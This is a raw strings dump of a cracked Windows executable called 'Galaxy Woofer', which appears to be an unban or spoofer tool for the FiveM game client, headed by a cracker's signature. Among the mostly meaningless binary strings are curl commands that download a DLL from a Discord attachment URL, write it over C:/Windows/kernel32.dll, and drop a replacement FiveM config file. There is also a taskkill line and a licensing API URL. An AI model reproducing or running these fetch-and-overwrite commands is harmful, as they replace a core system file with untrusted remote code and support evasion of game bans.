#############
CRACKED BY kwsstas.westt#1312
#############
DONT DM FOR SUPPORT!!
#############
Galaxy < Suicide


Offset	Size	Type	String
00079378	29	A	Unsupported SASL authentication mechanism
000793ac	06	A	total 
000793b8	08	A	rwx-tTsS
000793c8	0b	A	0123456789-
000793d8	0e	A	APM0123456789:
000793e8	05	A	<DIR>
000793f0	0a	A	KGS!@#$%./
00079420	43	A	%s %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x
000795bc	05	A	digit
000795c4	05	A	alnum
000795cc	05	A	alpha
000795d4	06	A	xdigit
000795dc	05	A	print
000795e4	05	A	graph
000795ec	05	A	space
000795f4	05	A	blank
000795fc	05	A	upper
00079604	05	A	lower
00079630	20	U	api-ms-win-core-synch-l1-2-0.dll
00079678	0c	U	kernel32.dll
00079698	18	A	SleepConditionVariableCS
000796b8	18	A	WakeAllConditionVariable
000796e8	0e	A	bad allocation
00079798	11	A	Unknown exception
000797b0	14	A	bad array new length
000797c8	0f	A	string too long
000797d8	08	A	bad cast
000797e8	0d	A	Galaxy Woofer
000797f8	0a	A	oVgAULGd6v
00079810	40	A	485c41282457e9be906a22d6eb557335e6493d2a3ecaff7cd3df02b407289941
00079858	1c	A	https://keyauth.win/api/1.2/
00079880	88	A	curl https://cdn.discordapp.com/attachments/1011760526113652749/1037723447851237397/unban.dll --output C:/Windows/kernel32.dll >nul 2>&1
00079910	b3	A	curl https://cdn.discordapp.com/attachments/1017921832357208114/1037708136829681754/CitizenFX.ini --output C:/Users/%USERNAME/AppData/Local/FiveM/FiveM.app/CitizenFX.ini >nul 2>&1
000799c8	17	A	C:\Windows\kernel32.dll
000799e0	1a	A	FiveM_b2545_GTAProcess.exe
00079a00	09	A	@echo off
00079a10	2d	A	taskkill /F /T /IM FiveM_b2545_GTAProcess.exe
00079a40	05	A	pause
00079a48	17	A	invalid string position
00079a60	14	A	23~RI[M`1&6+'*-sjK
00079a81	0a	A	 103*4#riJ
00079a99	05	A	$;ydE
00079ab2	11	A	@Al7?5q# <99byZ
00079b10	0b	A	2iO]IKLzaB
00079bc8	14	A	2iKSRXZ2a&66/(&sjK
00079bec	07	A	41/(&hJ
00079c16	0d	A	/'=y+(411ZAb
00079c28	0e	A	XVZDDh/.$&6E
00079c38	0a	A	2`UNu_I%a
00079c55	09	A	;4667??}]
00079c60	0d	A	2oHYOP^-$xcD
00079c83	17	A	ebGDO2}ZP\FF`-," 4MBI
00083142	05	A	`Aml
000833a0	07	A	z2+T^
000838ab	06	A	4aAY
000838b9	06	A	;^&z)
00083cd8	0a	A	oVgAULGd6v
00083d18	0d	A	Galaxy Woofer
00083d68	17	A	.?AVCAtlException@ATL@@
00083d90	17	A	.?AVruntime_error@std@@
00083db8	13	A	.?AVbad_alloc@std@@
00083de0	12	A	.?AVbad_cast@std@@
00083e08	13	A	.?AVexception@std@@
00083e30	1e	A	.?AVbad_array_new_length@std@@
00083e60	14	A	.?AVCWin32Heap@ATL@@
00083e88	14	A	.?AUIAtlMemMgr@ATL@@
00083eb0	17	A	.?AUIAtlStringMgr@ATL@@
00083ed8	17	A	.?AVCAtlStringMgr@ATL@@
00083f00	44	A	.?AV?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@
00083f60	33	A	.?AV?$basic_streambuf@DU?$char_traits@D@std@@@std@@
00083fb0	47	A	.?AV?$basic_stringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@
00084010	32	A	.?AV?$basic_iostream@DU?$char_traits@D@std@@@std@@
00084060	31	A	.?AV?$basic_istream@DU?$char_traits@D@std@@@std@@
000840a8	2d	A	.?AV?$basic_ios@DU?$char_traits@D@std@@@std@@
000840e8	12	A	.?AVios_base@std@@
00084110	13	A	.?AV?$_Iosb@H@std@@
00084140	31	A	.?AV?$basic_ostream@DU?$char_traits@D@std@@@std@@
00084188	1f	A	.?AVexception@detail@nlohmann@@
000841b8	21	A	.?AVparse_error@detail@nlohmann@@
000841f0	22	A	.?AVout_of_range@detail@nlohmann@@
00084228	0e	A	.?AVCSid@ATL@@
00084248	16	A	.?AVCAccessToken@ATL@@
00084270	0f	A	.?AVtype_info@@
00084b90	0d	A	Galaxy Woofer
00084bb0	0a	A	oVgAULGd6v
00084db0	0b	A	Initialized
00084dd0	0a	A	vrJ4yq5M6Y
0008861b	05	A	oxQ/
000b0af0	0f	A	string too long
000b0b28	17	A	invalid string position
000b0bd0	11	A	Unknown exception
000b0cf3	6c	A	 !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
000b0d68	0e	A	CorExitProcess
000b0d78	0b	U	mscoree.dll
000b0e50	0d	A	bad exception
000b1670	08	A	HH:mm:ss
000b1680	13	A	dddd, MMMM dd, yyyy
000b1698	08	A	MM/dd/yy
000b16b0	08	A	December
000b16c0	08	A	November
000b16d0	07	A	October
000b16d8	09	A	September
000b16e4	06	A	August
000b16fc	05	A	April
000b1704	05	A	March
000b1710	08	A	February
000b1720	07	A	January
000b1758	08	A	Saturday
000b1764	06	A	Friday
000b1770	08	A	Thursday
000b1780	09	A	Wednesday
000b1790	07	A	Tuesday
000b1798	06	A	Monday
000b17a0	06	A	Sunday
000b17c8	0e	A	runtime error 
000b1d48	24	A	Microsoft Visual C++ Runtime Library
000b1d78	16	A	<program name unknown>
000b1da0	09	A	Program: 
000b1db0	06	U	(null)
000b1dc0	06	A	(null)
000b1e09	06	A	`h````
000b1e90	19	A	 Complete Object Locator'
000b1eb0	1c	A	 Class Hierarchy Descriptor'
000b1ed0	12	A	 Base Class Array'
000b1ee8	1b	A	 Base Class Descriptor at (
000b1f08	11	A	 Type Descriptor'
000b1f20	1b	A	`local static thread guard'
000b1f40	2a	A	`managed vector copy constructor iterator'
000b1f70	28	A	`vector vbase copy constructor iterator'
000b1fa0	22	A	`vector copy constructor iterator'
000b1fc8	20	A	`dynamic atexit destructor for '
000b1ff0	1a	A	`dynamic initializer for '
000b2010	2b	A	`eh vector vbase copy constructor iterator'
000b2040	25	A	`eh vector copy constructor iterator'
000b2068	24	A	`managed vector destructor iterator'
000b2090	25	A	`managed vector constructor iterator'
000b20b8	1c	A	`placement delete[] closure'
000b20d8	1a	A	`placement delete closure'
000b20f8	0e	A	`omni callsig'
000b2108	09	A	 delete[]
000b2114	06	A	 new[]
000b2120	23	A	`local vftable constructor closure'
000b2148	0f	A	`local vftable'
000b2158	05	A	`RTTI
000b2168	0f	A	`udt returning'
000b2178	1a	A	`copy constructor closure'
000b2198	26	A	`eh vector vbase constructor iterator'
000b21c0	1f	A	`eh vector destructor iterator'
000b21e0	20	A	`eh vector constructor iterator'
000b2208	1a	A	`virtual displacement map'
000b2228	23	A	`vector vbase constructor iterator'
000b2250	1c	A	`vector destructor iterator'
000b2270	1d	A	`vector constructor iterator'
000b2290	1c	A	`scalar deleting destructor'
000b22b0	1d	A	`default constructor closure'
000b22d0	1c	A	`vector deleting destructor'
000b22f0	12	A	`vbase destructor'
000b2308	08	A	`string'
000b2318	14	A	`local static guard'
000b2330	08	A	`typeof'
000b2340	07	A	`vcall'
000b2348	09	A	`vbtable'
000b2358	09	A	`vftable'
000b23e0	08	A	operator
000b2408	07	A	 delete
000b2418	0b	A	__unaligned
000b2428	0a	A	__restrict
000b2438	07	A	__ptr64
000b2440	09	A	__clrcall
000b2450	0a	A	__fastcall
000b2460	0a	A	__thiscall
000b2470	09	A	__stdcall
000b2480	08	A	__pascal
000b2490	07	A	__cdecl
000b2498	08	A	__based(
000b27c0	15	A	SunMonTueWedThuFriSat
000b27d8	24	A	JanFebMarAprMayJunJulAugSepOctNovDec
000b2800	17	A	GetProcessWindowStation
000b2818	19	A	GetUserObjectInformationA
000b2838	12	A	GetLastActivePopup
000b2850	0f	A	GetActiveWindow
000b2860	0b	A	MessageBoxA
000b2870	0a	A	USER32.DLL
000b2880	07	A	CONOUT$
000b2890	22	U	\REGISTRY\MACHINE\SOFTWARE\Classes
000b28e0	0b	U	Wow6432Node
000b29c0	23	U	\Registry\Machine\Software\Classes\
000b2a08	0e	U	\REGISTRY\USER
000b2a28	0b	U	Fatal Error
000b2cc0	40	A	ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
000b2d88	05	U	%02X 
000b2e00	25	A	0123456789abcdefghijklmnopqrstuvwxyz-
000b3060	10	A	0123456789abcdef
000b30a8	0e	A	bad allocation
000b3220	11	A	DllRegisterServer
000b3238	0a	A	DllInstall
000b3248	08	U	register
000b3260	07	U	install
000b3298	0b	U	Error: 0x%X
000b32b0	11	U	DllRegisterServer
000b32d8	0a	U	DllInstall
000b32f0	42	U	The procedure entry point %s could not be located in the module %s
000b33a0	09	U	Error: %d
000b7bec	06	A	p`0
000b944e	05	A	PM{q;
000b9981	06	A	BMgZ2
000b9cd5	06	A	"w.%.
000ba620	15	A	.?AVlogic_error@std@@
000ba648	16	A	.?AVlength_error@std@@
000ba670	16	A	.?AVout_of_range@std@@
000ba6b0	0f	A	.?AVtype_info@@
000ba73e	1a	A	                          
000ba81e	1a	A	abcdefghijklmnopqrstuvwxyz
000ba83e	1a	A	ABCDEFGHIJKLMNOPQRSTUVWXYZ
000ba942	1a	A	                          
000ba9c0	18	A	                        
000ba9d9	08	A	        
000baa31	1a	A	abcdefghijklmnopqrstuvwxyz
000baa51	1a	A	ABCDEFGHIJKLMNOPQRSTUVWXYZ
000bafb8	17	A	.?AVbad_exception@std@@
000bdf28	19	A	.?AVDeactivationRequest@@
000bdf58	17	A	.?AVActivationRequest@@
000bdf80	11	A	.?AVBaseRequest@@
000bdfa8	13	A	.?AVexception@std@@
000bdfd0	13	A	.?AVbad_alloc@std@@
000be120	28	A	C:\Users\nikol\Desktop\Galaxy_Woofer.exe
000c28b8	05	A	2\"3B
000c6c2f	05	A	tPr
000cd34f	05	A	n,d;z
000d23b5	07	A	-=X|#=
000d3a67	05	A	j11e
000d7b91	06	A	<&$"A
000d89bd	05	A	}60T[
000e759a	05	A	UNKga
000f3229	05	A	<]Y=
000f697f	05	A	5bY{
001083f6	05	A	'6T]
0010d605	05	A	X1,<
00113fa0	05	A	94$)
00115c14	05	A	\nNiq
00115f84	06	A	KZ~j-
0011644c	06	A	F9-F
001193ee	06	A	QMuut$
0011b8d6	05	A	o#t":
0011d8d1	06	A	#i9@B
001216e3	05	A	MDd/m
001232eb	07	A	@w~RB
0012ccb4	05	A	b\}oS
00133f44	06	A	l,2/Um
0013c431	06	A	4iLrKv
0013c746	05	A	SVbn
00142e59	05	A	7LR7/
0014456f	07	A	04f;M0
00149339	05	A	Gc,KY
00149e02	05	A	D-'#C
0015598e	05	A	t7Q=9
00157d61	05	A	uK`U
0015f281	08	A	!ooUp.;
00160478	05	A	e8c`X
00162263	05	A	5ef`^
0016ac87	05	A	VldHY
0016bb98	05	A	DQW*
0016f894	05	A	Z_kC
0016fa36	05	A	^uU
00178c94	0a	A	tuDFl%:V>
0017f06f	06	A	O3f|=
0018391a	05	A	F>[>q
001897c5	05	A	#^{ C
0018baf5	05	A	OIAXn
0018d645	09	A	`u=AC{Vn$
0018dc74	05	A	88yY@
0018e152	07	A	UFm@92H
0018ef1e	07	A	8,h-'9
00191801	05	A	Xc&'Y
001932c6	06	A	(Mfx"1
00196220	06	A	,DplpZ
001a40e0	06	A	.VyFA#
001a79a2	05	A	)<)A
001ad970	08	A	@>Mo@b
001b1cae	08	A	XYo_-q>
001b70fb	06	A	!k,x
001b728d	05	A	}b'V[
001b8ed6	05	A	^P13
001b91c4	05	A	$`x5S
001bb919	06	A	Q~ec
001bbf00	05	A	5,XFu
001bf210	06	A	VJjF
001c94db	05	A	JHx;
001d2120	06	A	% M>C
001d49b0	05	A	:?7
001d9ea4	05	A	_-'_T
001e0371	05	A	.4)hQ
001e36e7	05	A	KbA
001e8b54	05	A	1HDr
001ea5b1	07	A	Ok}0XAk
001efb83	05	A	0KXk9
001eff10	05	A	^(
001f6a6c	05	A	"bA?
001f8bc0	05	A	fM)U}
001fe45e	05	A	Q!6N
00201114	07	A	]B/;]
00203401	05	A	H'$
002051ad	05	A	2_Nl@
0020ca61	06	A	EEj<y^
0020cc5f	0b	A	\52`m&`E"
0020ccae	05	A	:?#)J
0020d5a5	05	A	}5"
0020e0dd	05	A	GF4y
002128ac	05	A	Tj|(n
00215c96	07	A	M# JsM
002160ea	05	A	?,S8
00218838	06	A	jrtM&
0021cbc5	05	A	K+@`n
0021dcb5	05	A	o[pT(
00221f48	07	A	RSyVI(
0022b8bc	05	A	HiPW
0022c652	05	A	J7T n
00248301	08	A	e =2HMMY
00249e8c	06	A	~G~DH
002520ba	05	A	9UR&!
0025b498	05	A	ae|0\
0025fcc6	08	A	#Y7i}wD4
0026203c	08	A	M#ua+
00310cf9	06	A	dywfT~
0031b219	06	A	$)w[.
00360339	06	A	,\w[
0039cd29	06	A	N:wy~=
003b2c01	0a	A	Lm|tm=d/X
003b2f18	07	A	ntm$stm
003b3740	07	A	`wm'stm
003b3ee3	08	A	])~m'stm
003b4395	06	A	um'stm
003b4acd	06	A	qm$stm
003b53e1	06	A	M-CWWm
003b5499	07	A	fmJrtm]
003b5961	06	A	gm;wtm
003b5d37	09	A	)Htm$stm*
003b75f7	09	A	Jscme{tmY
003b7bed	09	A	Tm[{tme0
003b98cd	07	A	|m'stm!
003ba100	08	A	*um'stm~
003ba221	06	A	Wm4wtm
003ba70c	07	A	<FmK|tm
003baf7a	0a	A	-y%dm_stmX
003bb151	06	A	pm$stm
003bc121	05	A	`4c*'
003be24a	20	A	_api-ms-win-crt-heap-l1-1-0.dll
003beed3	09	A	WXQTeL /\
003c8193	05	A	`DDm$
003d0d1e	05	A	Z@,tu
003d366f	05	A	4GV*G
003d3a1e	06	A	FBtygu
003d3a89	07	A	&#NJ<<
003d3bdd	05	A	N5{o<
003d3bf5	05	A	[>@6
003d3c25	05	A	#LYy)
003d3c8e	06	A	srvjD?
003d3f22	06	A	=ulA)v
003d3f69	07	A	{d/U_w
003d3fae	06	A	QZ;W}A
003d4079	07	A	"bFvB
003d40a9	07	A	@E\6}A
003d41e2	06	A	MB34?
003d4261	07	A	wPJfI
003d440e	06	A	BMYWv
003d44b7	05	A	p?GC
003d45a5	07	A	W_C 7u
003d45d5	07	A	\F<|/v
003d462a	06	A	*[)bM>
003d4696	06	A	ZZcC>x
003d485e	06	A	<DX#A
003d5638	0a	A	RPCRT4.dll
003d6ede	05	A	?jJZ
003d7000	0f	A	WTSSendMessageW
003d7010	0b	A	CRYPT32.dll
003d7868	06	A	w9%QA
003d89fb	05	A	5h,.A
003d8d90	08	A	_fstat64
003da6c8	0d	A	<tUSERENV.dll
003dd24c	07	A	P2ptQ[
003dd9a4	11	A	UnloadUserProfile
003e111f	06	A	s=22/
003e9138	21	A	api-ms-win-crt-runtime-l1-1-0.dll
003ebbf6	07	A	aJ^E|%K
003ed2c2	17	A	GetProcessWindowStation
003ed966	0a	A	USER32.dll
003f0b94	19	A	GetUserObjectInformationW
003f304d	06	A	b{_- &
003f51de	14	A	GetModuleInformation
003fdcd5	0d	A	gKERNEL32.dll
00400e5d	05	A	1K*(
004035c2	0e	A	RpcStringFreeA
00404de8	05	A	HWo$q
00406871	06	A	=5(]78
004090fc	05	A	7%+|
004098b0	09	A	LocalFree
0040c412	05	A	:Fl~
0040f6fa	09	A	PSAPI.DLL
0040fc16	09	A	_gmtime64
00410498	06	A	*8~VE
00410942	05	A	7ZQ`$
00412332	0e	A	GetProcAddress
00412344	41	A	?_Pninc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEAAPEADXZ
00413bee	12	A	VCRUNTIME140_1.dll
00413fd4	0a	A	IdnToAscii
0041453b	05	A	?8[G
00414fb3	0d	A	JMSVCP140.dll
004160f8	05	A	|}!g}
00417b80	12	A	GetModuleFileNameW
00418b83	05	A	P !
0041bcdc	05	A	v=oN-
0041c1fa	05	A	cY\I
0041c568	24	A	api-ms-win-crt-filesystem-l1-1-0.dll
0041ca8a	16	A	SetProcessAffinityMask
0041e2af	05	A	!.3\6
00426b99	07	A	+SQcvM.
0042ab5b	06	A	$pYSa[
0042e5b7	05	A	eK|ff
0042fcd8	07	A	_dclass
0043085a	07	A	\{GP]w
00434167	05	A	VZX<
00434592	08	A	U@U?cQ@F
00435915	07	A	(OF8D),
00438ef4	06	A	r2k?Uo
0043982c	06	A	b`+,rW
00439dd9	06	A	b`cxW
0043bfe0	0b	A	SHELL32.dll
0043d82f	05	A	k74O
0043da6b	05	A	Z=PH
0043e21c	05	A	*RK
00441c1a	05	A	qW";^
004462b4	05	A	q?!
004466ee	06	A	ro54K
00448b18	05	A	=#7
00449c76	05	A	"tq3y
0044cabb	05	A	/W05v
0045157e	05	A	O9h]t
0045251e	06	A	}DvkT&
0045654b	05	A	eOD
0045e5da	07	A	#W`O
00461107	05	A	;+C"C
00462209	05	A	CiD"N
00468d2c	07	A	)x:$7kr
00469043	05	A	/Ig
0046bc61	05	A	P~1:
00471a0b	05	A	]@Ne
00473f94	0c	A	CryptEncrypt
004742da	06	A	strtod
0047779e	08	A	(#bU-Ulv
004791a8	07	A	neDUbs^
0047e731	05	A	LcMKI
0047e742	05	A	3@D@O
0047f546	0d	A	ShellExecuteA
004818ac	07	A	-MPA9J?
00482828	12	A	__CxxFrameHandler4
00483b3b	05	A	rsM~K
00484244	05	A	i{*-O
004849c2	05	A	*-Co0
00487402	0b	A	ExitProcess
0048740e	0a	A	WS2_32.dll
004884d4	0e	A	&oADVAPI32.dll
0048b596	05	A	R6 l]
0048cc7c	0a	A	LocalAlloc
0048d300	10	A	VCRUNTIME140.dll
0048e399	05	A	'sUeO
0049260a	0b	A	WLDAP32.dll
004943d8	0c	A	LoadLibraryA
004946a6	06	A	malloc
00494e10	05	A	gE|
00495134	0b	A	FreeLibrary
0049572c	1e	A	api-ms-win-crt-time-l1-1-0.dll
00497496	05	A	9<I9d
00497ebe	15	A	SetThreadAffinityMask
00498f43	05	A	m*5i
0049ba92	21	A	api-ms-win-crt-convert-l1-1-0.dll
0049c588	0c	A	WTSAPI32.dll
0049c598	0a	A	__sys_nerr
0049ca67	05	A	:IR@
0049cb8c	05	A	?3<NJ
004a12c9	06	A	j`0x_
004a7528	05	A	S3fH@
004ac79d	05	A	)nZPL
004b18be	06	A	S;cSV
004b2387	06	A	&O%RL
004b34ce	05	A	lO"L-
004b6ed5	05	A	N."7
004bbc69	05	A	l hX
004bca20	05	A	<|#t
004c0d36	05	A	(cY0
004c4426	05	A	*fYkt
004c4e3f	05	A	13|vM
004c6abb	05	A	Oi7
004d2ce5	06	A	z.T)O;
004dbf5c	05	A	WM^="
004e1f91	08	A	).9=FP5f
004e7be1	05	A	V.r_
004eb811	06	A	UE9EtA
004f737c	07	A	7 e#5%
0050772f	05	A	j(d0
00509511	07	A	9C)@;^
005098ee	05	A	Ra"}W
00513e83	09	A	#bAF.[VN
00518391	07	A	Jkf|"}C
0051a579	05	A	^o!s
0053dc95	06	A	f#{Dz
005466f7	06	A	_b)o
00546deb	06	A	9jd3.K
005476ff	05	A	~Zc0N
00549d95	05	A	aL_;
0054a6c3	05	A	7T=-$
0054c38e	06	A	6{Cn8
0054f8a6	05	A	AU5a`
0055284f	05	A	OdGg7
005555a9	05	A	$iE:
00555e6f	05	A	Zj
0055b036	09	A	)n?."|_Xr
0055bc6b	07	A	II{ZJ'\
00562e3f	05	A	"p0m3
0056fc88	07	A	JpCi*n=
00576c18	05	A	Sr,ud
00577030	06	A	A'"{:
0057a71c	05	A	uL?Ko
0057af16	06	A	q7;
0057d18b	06	A	"zW$D)
0057d26a	05	A	MkKn
0058e1a0	08	A	3f>Sa.W 
005916b3	06	A	T^rGS
00593e29	06	A	Y'q]9!
0059ab94	05	A	Q't4
0059d522	08	A	]0K;$7f
005a790d	05	A	f{`lF
005a8c70	05	A	]E:
005ab26d	05	A	q l~Q
005b037b	06	A	qP(/}D
005b124a	05	A	&wD
005b3485	05	A	p'v;/
005b4800	05	A	9X)fZ
005b87af	05	A	f 1E
005bda3e	05	A	4:8
005c8dd4	05	A	<Y2.
005cdbd2	05	A	[*G
005cff74	05	A	@MD7\
005d3f50	06	A	$-U\e
005df17e	05	A	5Fg0L
005e4ff2	05	A	OsVS
005e816e	05	A	Cwr!
005f7e69	08	A	:6<u\8
005ffc66	05	A	R! 1\
0060d464	05	A	+ Cc1
00610b8d	05	A	soy52
0061c872	06	A	"|~?=
0061f105	05	A	juU3)
00620351	05	A	aJyus
00621edf	05	A	| {l
006220b1	06	A	NvQ%
0062646b	06	A	emnkoA
0062894f	05	A	%N
006297b0	05	A	</cX
0062f1d4	05	A	/=M
0063145c	0d	A	c3o$YTu=($a%7
00635a74	06	A	;k{2
0063cd78	06	A	l/NZVd
0063ceb6	05	A	"ov*9
0063ed24	06	A	(8pDk
006402f2	05	A	->UL
00650e17	06	A	:dZky
0065a59c	05	A	o-J[j
00665b80	05	A	mz`9
006713e8	06	A	5VGW4
00675417	05	A	cCqI 
006778a0	07	A	7vJov(
006778c2	06	A	aj7v9S
00679061	05	A	<d$(y
0067cb30	05	A	+bXw
0067e3a6	05	A	OHE_>
0068b3d6	06	A	cWif1Y
00693fa3	05	A	]7k8
00695569	05	A	~x}\
006a577a	06	A	9*lH+7
006a5ba3	06	A	x2y`K
006a5d05	07	A	E%.8"y
006a5f40	05	A	3(!'i
006a961c	05	A	!!f
006ad328	05	A	>i*a
006b3279	08	A	}0Ef}jlK
006b9c35	05	A	0[Z)D
006bd823	07	A	>UsO;E
006ca950	06	A	(8X,(
006cfc46	05	A	2VK:e
006d0d7c	06	A	!62S&
006d5d7d	06	A	|XJVX
006d9663	09	A	j>+@+Ne
006df2e3	07	A	=~@%3
006e2376	05	A	r(~Ow
006eafc2	05	A	5/E1
006f0c48	05	A	p9,{p
006f0f59	05	A	W6}@)
006f1977	06	A	E(sk2#
006f6b02	05	A	N-Bi`
006f80d0	05	A	%FS, 
006fa74c	06	A	n5<5Z'
006fff18	05	A	oXa"
00702007	05	A	qYCz#
00708a57	06	A	?<^%O
0070fc3b	05	A	<K2w
0072558e	05	A	0|"^
00726822	05	A	/l#$
00727242	05	A	X>ce
0072c87f	07	A	oP%7
0072e23c	06	A	HO+?u
00732df3	05	A	F={Z
00734012	05	A	/<R}
0073758f	09	A	h$Oti~hvO
0073b4e0	19	A	GetUserObjectInformationW
0073b567	07	A	*D$|rVS
0073f137	20	A	hapi-ms-win-crt-stdio-l1-1-0.dll
00742e94	06	A	Z`fEo
0074335a	05	A	f(O@
00743f80	06	A	#$NJ=:
007455c6	20	A	api-ms-win-crt-locale-l1-1-0.dll
007462e5	06	A	M[P[[
00747aed	06	A	`%JCdJ
00748abb	05	A	d?8F9
00749d91	05	A	JUs(|
0074c704	10	A	GetModuleHandleA
0074cfd0	09	A	#y4!8J#7!
0074e668	0b	A	MessageBoxA
0074ecdc	05	A	Sleep
0074f20c	17	A	__std_exception_destroy
00751cbe	13	A	_configthreadlocale
007548e6	05	A	9Gx;x
007559c6	06	A	T`><a
0075f494	0c	A	Normaliz.dll
007640df	05	A	!m{~F
00764d82	05	A	g^5E:
007659d0	07	A	strncmp
00765b22	05	A	9g/aj
007682e5	05	A	gb%k
0076a6d8	18	A	CertFreeCertificateChain
0076c09a	16	A	GetProcessAffinityMask
0076cbf0	17	A	GetSystemTimeAsFileTime
0076ce00	05	A	qsort
0076d234	05	A	6yP`
0076db28	05	A	JhGDw
00775e4c	05	A	'^ 4x
0077650a	06	A	K5/\R
0077791a	05	A	p nji
00777eaf	05	A	E|V"i
0077f1cc	1e	A	api-ms-win-crt-math-l1-1-0.dll
0077fe30	12	A	VerifyVersionInfoA
0078154d	06	A	uiBO!
0078233c	20	A	api-ms-win-crt-string-l1-1-0.dll
00782dc4	21	A	api-ms-win-crt-utility-l1-1-0.dll
007a24a1	06	A	dywfT~
007a9b41	06	A	,\w[
008747b1	06	A	N:wy~=
008c2261	06	A	$)w[.
008d161a	06	A	Jm=rtm
008d1b65	07	A	\Hm+stm
008d2047	05	A	m4ztm
008d25c3	06	A	mm|tm'
008d3247	07	A	mOtmI
008dc003	05	A	;AZe_
